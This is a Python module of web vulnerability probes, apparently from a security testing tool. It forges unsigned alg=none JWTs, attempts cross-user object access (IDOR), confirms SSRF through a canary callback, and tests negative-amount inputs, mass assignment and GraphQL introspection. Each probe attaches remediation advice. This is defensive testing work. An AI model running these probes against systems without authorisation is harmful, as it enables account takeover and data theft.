"""The probes. Each is a fixed request sequence and a comparison."""

from __future__ import annotations

import json
from typing import Any

from buggy.capture.probes.base import (
    Context,
    ProbeInputError,
    ProbeResult,
    b64url_decode,
    b64url_encode,
    contains_value,
    headers_of,
    json_of,
    ok,
    require,
    set_path,
    similarity,
    text,
)

# ── authentication / session ─────────────────────────────────────────


def forge_unsigned_jwt(token: str, claim_overrides: dict[str, Any] | None = None) -> str:
    """The same claims as ``token`` under ``alg: none`` with an empty signature."""
    parts = token.strip().split(".")
    if len(parts) != 3:
        raise ProbeInputError("token is not a three-part JWT")
    try:
        payload = json.loads(b64url_decode(parts[1]))
    except (ValueError, UnicodeDecodeError) as exc:
        raise ProbeInputError("token payload is not base64url JSON") from exc
    if claim_overrides:
        payload = _deep_merge(payload, claim_overrides)
    header = {"typ": "JWT", "alg": "none"}
    return ".".join(
        (
            b64url_encode(json.dumps(header, separators=(",", ":")).encode()),
            b64url_encode(json.dumps(payload, separators=(",", ":")).encode()),
            "",
        )
    )


def _deep_merge(base: Any, extra: dict[str, Any]) -> Any:
    if not isinstance(base, dict):
        return extra
    merged = dict(base)
    for key, value in extra.items():
        merged[key] = _deep_merge(merged.get(key), value) if isinstance(value, dict) else value
    return merged


def jwt_alg_none(ctx: Context, params: dict[str, Any]) -> ProbeResult:
    """Does the server accept a token whose signature was removed?"""
    require(params, "url", "token")
    url, token = str(params["url"]), str(params["token"]).removeprefix("Bearer ").strip()
    header_name = str(params.get("header") or "Authorization")
    prefix = "" if header_name.lower() != "authorization" else "Bearer "
    extra = headers_of(params.get("headers"))
    overrides = (
        params.get("claim_overrides") if isinstance(params.get("claim_overrides"), dict) else None
    )

    def call(value: str, note: str):
        return ctx.send("GET", url, headers={**extra, header_name: prefix + value}, note=note)

    valid = call(token, "valid token (baseline)")
    if not ok(valid):
        return ProbeResult(
            "jwt_alg_none", "auth_session", "CWE-347", None,
            f"the supplied token was not accepted (HTTP {valid.status}); cannot compare",
            [valid.id],
        )  # fmt: skip
    head, payload, signature = token.split(".")
    corrupted = ".".join(
        (head, payload, ("A" if not signature.startswith("A") else "B") + signature[1:])
    )
    control = call(corrupted, "corrupted signature (control: must be rejected)")
    forged = call(forge_unsigned_jwt(token, overrides), "alg=none, signature removed")
    evidence = [valid.id, control.id, forged.id]
    details = {
        "valid_status": valid.status,
        "corrupted_signature_status": control.status,
        "unsigned_status": forged.status,
        "unsigned_similarity_to_valid": similarity(valid, forged),
        "claim_overrides": overrides or {},
    }
    if ok(control) and similarity(valid, control) > 0.9:
        return ProbeResult(
            "jwt_alg_none", "auth_session", "CWE-347", True,
            "the endpoint accepts a token with a corrupted signature: signatures are not verified at all",
            evidence, details,
            "Verify the signature of every token with a fixed, server-chosen algorithm and key.",
        )  # fmt: skip
    accepted = ok(forged) and (overrides is not None or similarity(valid, forged) > 0.9)
    return ProbeResult(
        "jwt_alg_none", "auth_session", "CWE-347", accepted,
        (
            "the endpoint accepts an unsigned (alg=none) token while rejecting a corrupted signature"
            if accepted
            else f"the unsigned token was rejected (HTTP {forged.status})"
        ),
        evidence, details,
        "Pin the accepted algorithms server-side (never `none`) and reject tokens whose `alg` differs.",
    )  # fmt: skip


# ── access control ───────────────────────────────────────────────────


def idor(ctx: Context, params: dict[str, Any]) -> ProbeResult:
    """Can one identity read an object that belongs to another?"""
    require(params, "url", "owner_headers", "attacker_headers")
    url = str(params["url"])
    owner = ctx.send(
        "GET",
        url,
        headers=headers_of(params["owner_headers"], "owner_headers"),
        note="owner reads own object",
    )
    if not ok(owner):
        return ProbeResult(
            "idor", "access_control", "CWE-639", None,
            f"the owner could not read the object (HTTP {owner.status}); nothing to compare against",
            [owner.id],
        )  # fmt: skip
    attacker = ctx.send(
        "GET",
        url,
        headers=headers_of(params["attacker_headers"], "attacker_headers"),
        note="other identity reads the same object",
    )
    evidence = [owner.id, attacker.id]
    markers = [str(m) for m in params.get("markers") or []]
    body = text(attacker)
    marker_hits = [m for m in markers if m in body]
    score = similarity(owner, attacker)
    details: dict[str, Any] = {
        "owner_status": owner.status,
        "attacker_status": attacker.status,
        "similarity": score,
        "markers_found": marker_hits,
    }
    if params.get("check_unauthenticated", True):
        anonymous = ctx.send("GET", url, note="no credentials")
        evidence.append(anonymous.id)
        details["unauthenticated_status"] = anonymous.status
        details["unauthenticated_similarity"] = (
            similarity(owner, anonymous) if ok(anonymous) else 0.0
        )
    exposed = ok(attacker) and (bool(marker_hits) if markers else score >= 0.9)
    if exposed and details.get("unauthenticated_similarity", 0) >= 0.9:
        return ProbeResult(
            "idor", "access_control", "CWE-862", True,
            "the object is returned without any credentials: the endpoint has no access control",
            evidence, details,
            "Require authentication, then authorise the caller against the object's owner.",
        )  # fmt: skip
    return ProbeResult(
        "idor", "access_control", "CWE-639", exposed,
        (
            "a different identity received the owner's object"
            if exposed
            else f"the other identity did not receive the owner's object (HTTP {attacker.status}, similarity {score})"
        ),
        evidence, details,
        "Authorise every object access against the authenticated caller server-side; do not rely "
        "on identifiers being unguessable.",
    )  # fmt: skip


# ── SSRF ─────────────────────────────────────────────────────────────

CANARY_PLACEHOLDER = "{{CANARY}}"


def ssrf_canary(ctx: Context, params: dict[str, Any]) -> ProbeResult:
    """Does the server fetch a URL we give it? Proven by a callback, not by guessing."""
    require(params, "url")
    if ctx.canary is None or not ctx.canary.available:
        return ProbeResult(
            "ssrf_canary", "ssrf", "CWE-918", None,
            "no callback listener is configured (BUGGY_CANARY_BASE_URL), so SSRF cannot be "
            "confirmed out of band",
        )  # fmt: skip
    method = str(params.get("method") or "POST").upper()
    url, body = str(params["url"]), params.get("body")
    headers = headers_of(params.get("headers"))
    if isinstance(body, (dict, list)):
        body = json.dumps(body)
        headers.setdefault("Content-Type", "application/json")
    body = "" if body is None else str(body)
    if CANARY_PLACEHOLDER not in url and CANARY_PLACEHOLDER not in body:
        raise ProbeInputError(
            f"put {CANARY_PLACEHOLDER} where the URL parameter goes (url or body)"
        )
    token, canary_url = ctx.canary.mint(ctx.engagement)
    capture = ctx.send(
        method,
        url.replace(CANARY_PLACEHOLDER, canary_url),
        headers=headers,
        body=body.replace(CANARY_PLACEHOLDER, canary_url) or None,
        note="request carrying the canary URL",
    )
    hits = ctx.canary.wait_for_hit(
        ctx.engagement, token, timeout=float(params.get("wait_seconds") or 8)
    )
    details = {
        "canary_url": canary_url,
        "request_status": capture.status,
        "callbacks": [hit.to_dict() for hit in hits],
    }
    return ProbeResult(
        "ssrf_canary", "ssrf", "CWE-918", bool(hits),
        (
            f"the target fetched the canary URL ({len(hits)} callback(s) from {hits[0].remote})"
            if hits
            else "no callback arrived: the target did not fetch the supplied URL in the wait window"
        ),
        [capture.id], details,
        "Do not fetch caller-supplied URLs server-side. If required, resolve and validate the "
        "destination against an allow-list and block internal, link-local and metadata ranges.",
    )  # fmt: skip


# ── business logic ───────────────────────────────────────────────────


def numeric_boundary(ctx: Context, params: dict[str, Any]) -> ProbeResult:
    """Does the server accept a quantity/amount it should refuse (negative, zero)?"""
    require(params, "url", "body", "field")
    if not isinstance(params["body"], dict):
        raise ProbeInputError("body must be a JSON object")
    method = str(params.get("method") or "POST").upper()
    url, field = str(params["url"]), str(params["field"])
    headers = {"Content-Type": "application/json", **headers_of(params.get("headers"))}
    values = params.get("values") or [-1]
    accepted: list[dict[str, Any]] = []
    evidence: list[str] = []
    for value in values:
        if isinstance(value, bool) or not isinstance(value, (int, float)):
            raise ProbeInputError("values must be numbers")
        capture = ctx.send(
            method, url, headers=headers, body=json.dumps(set_path(params["body"], field, value)),
            note=f"{field}={value}",
        )  # fmt: skip
        evidence.append(capture.id)
        echoed = contains_value(json_of(capture), field.split(".")[-1], value)
        if ok(capture):
            accepted.append(
                {"value": value, "status": capture.status, "echoed_in_response": echoed}
            )
    invalid = [a for a in accepted if a["value"] <= 0]
    return ProbeResult(
        "numeric_boundary", "business_logic", "CWE-20", bool(invalid),
        (
            f"the server accepted {field}={invalid[0]['value']} (HTTP {invalid[0]['status']})"
            if invalid
            else f"every out-of-range value for {field} was rejected"
        ),
        evidence, {"field": field, "accepted": accepted, "tested": list(values)},
        "Validate numeric business inputs server-side (range, sign, integer) before using them in "
        "price or balance calculations.",
    )  # fmt: skip


# ── API: mass assignment ─────────────────────────────────────────────


def mass_assignment(ctx: Context, params: dict[str, Any]) -> ProbeResult:
    """Does the server store a privileged field the client was never meant to set?"""
    require(params, "url", "body", "extra_fields")
    if not isinstance(params["body"], dict) or not isinstance(params["extra_fields"], dict):
        raise ProbeInputError("body and extra_fields must be JSON objects")
    method = str(params.get("method") or "POST").upper()
    url = str(params["url"])
    headers = {"Content-Type": "application/json", **headers_of(params.get("headers"))}
    extra: dict[str, Any] = params["extra_fields"]
    capture = ctx.send(
        method, url, headers=headers, body=json.dumps({**params["body"], **extra}),
        note=f"request with extra field(s): {', '.join(extra)}",
    )  # fmt: skip
    evidence = [capture.id]
    document = json_of(capture)
    reflected = {k: v for k, v in extra.items() if contains_value(document, k, v)}
    details: dict[str, Any] = {"status": capture.status, "reflected_in_response": reflected}
    readback_url = params.get("readback_url")
    if readback_url and ok(capture):
        readback = ctx.send(
            "GET",
            str(readback_url),
            headers=headers_of(params.get("readback_headers") or params.get("headers")),
            note="read back the stored object",
        )
        evidence.append(readback.id)
        stored = {k: v for k, v in extra.items() if contains_value(json_of(readback), k, v)}
        details["stored_per_readback"] = stored
        reflected = {**reflected, **stored}
    vulnerable = ok(capture) and bool(reflected)
    return ProbeResult(
        "mass_assignment", "api", "CWE-915", vulnerable if ok(capture) else None,
        (
            f"the server accepted and stored client-supplied {', '.join(reflected)}"
            if vulnerable
            else (
                "the extra field(s) were ignored"
                if ok(capture)
                else f"the request was not accepted (HTTP {capture.status}); cannot tell"
            )
        ),
        evidence, details,
        "Bind request bodies to an explicit allow-list of client-writable fields; never pass the "
        "raw body to the persistence layer.",
    )  # fmt: skip


# ── GraphQL ──────────────────────────────────────────────────────────

_INTROSPECTION = (
    "query { __schema { queryType { name fields { name } } mutationType { name } types { name } } }"
)


def graphql_checks(ctx: Context, params: dict[str, Any]) -> ProbeResult:
    """Introspection, field suggestions, and an optional unauthenticated-data check."""
    require(params, "url")
    url = str(params["url"])
    headers = {"Content-Type": "application/json", **headers_of(params.get("headers"))}
    evidence: list[str] = []
    findings: list[str] = []
    details: dict[str, Any] = {}

    intro = ctx.send(
        "POST",
        url,
        headers=headers,
        body=json.dumps({"query": _INTROSPECTION}),
        note="introspection",
    )
    evidence.append(intro.id)
    schema = (
        ((json_of(intro) or {}).get("data") or {}).get("__schema")
        if isinstance(json_of(intro), dict)
        else None
    )
    details["introspection_enabled"] = isinstance(schema, dict)
    if isinstance(schema, dict):
        details["type_count"] = len(schema.get("types") or [])
        findings.append("introspection is enabled")

    # Suggestions only fire for a near-miss of a real field, so misspell one
    # the schema told us about; fall back to common names when it did not.
    known = [
        str(f.get("name"))
        for f in ((schema or {}).get("queryType") or {}).get("fields") or []
        if isinstance(f, dict) and len(str(f.get("name") or "")) > 3
    ]
    # Appending a letter cannot collide with a shorter sibling field
    # (``pastes`` minus a letter is the valid field ``paste``).
    candidates = [f"{name}z" for name in known[:2]] or ["userz", "usersz", "nodez"]
    details["field_suggestions"] = False
    for candidate in candidates:
        typo = ctx.send(
            "POST",
            url,
            headers=headers,
            body=json.dumps({"query": f"query {{ {candidate} }}"}),
            note=f"misspelled field {candidate!r} (suggestions)",
        )
        evidence.append(typo.id)
        if "did you mean" in text(typo).lower():
            details["field_suggestions"] = True
            findings.append("error messages suggest valid field names")
            break

    query = params.get("unauthenticated_query")
    if query:
        anonymous = ctx.send(
            "POST", url, headers={"Content-Type": "application/json"},
            body=json.dumps({"query": str(query)}), note="sensitive query without credentials",
        )  # fmt: skip
        evidence.append(anonymous.id)
        data = (
            (json_of(anonymous) or {}).get("data") if isinstance(json_of(anonymous), dict) else None
        )
        returned = _non_empty(data)
        markers = [str(m) for m in params.get("markers") or []]
        hit = returned and (not markers or any(m in text(anonymous) for m in markers))
        details["unauthenticated_data_returned"] = bool(hit)
        if hit:
            findings.append("a sensitive query returned data without credentials")

    access_issue = bool(details.get("unauthenticated_data_returned"))
    return ProbeResult(
        "graphql_checks",
        "access_control" if access_issue else "graphql",
        "CWE-862" if access_issue else "CWE-200",
        bool(findings),
        "; ".join(findings) if findings else "introspection and suggestions are off; no data without credentials",
        evidence, details,
        "Disable introspection and field suggestions in production, and enforce authorisation in "
        "every resolver rather than at the HTTP layer.",
    )  # fmt: skip


def _non_empty(value: Any) -> bool:
    if isinstance(value, dict):
        return any(_non_empty(v) for v in value.values())
    if isinstance(value, list):
        return len(value) > 0
    return value not in (None, "", False)
